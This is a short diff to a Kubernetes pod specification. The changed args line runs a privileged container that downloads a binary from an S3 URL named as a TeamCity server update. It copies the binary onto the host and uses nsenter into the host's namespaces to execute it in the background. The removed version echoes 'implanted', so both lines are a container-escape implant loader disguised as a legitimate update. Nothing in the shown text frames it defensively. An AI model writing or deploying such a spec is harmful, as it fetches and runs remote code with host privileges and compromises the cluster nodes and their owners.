@@ -11,7 +11,7 @@ spec:
     image: alpine:latest
     command: ["/bin/sh", "-c"]
     args:
-    - "apk add --no-cache curl > /dev/null 2>&1 && curl -fsSL -o /tmp/ts https://jetbrainsteam-updates.s3.amazonaws.com/teamcity-server-update.bin && cp /tmp/ts /host/tmp/ts && chmod +x /host/tmp/ts && nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash -c 'chmod +x /tmp/ts && nohup /tmp/ts > /dev/null 2>&1 &' 2>&1; echo 'implanted' && sleep 99999"
+    - "apk add --no-cache curl > /dev/null 2>&1 && rm -f /host/tmp/ts && curl -fsSL -o /tmp/ts https://jetbrainsteam-updates.s3.amazonaws.com/teamcity-server-update.bin && cp /tmp/ts /host/tmp/ts && chmod +x /host/tmp/ts && nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh -c 'chmod +x /tmp/ts && /tmp/ts &' 2>&1; echo 'DONE'; sleep 99999"
     securityContext:
       privileged: true
     volumeMounts:
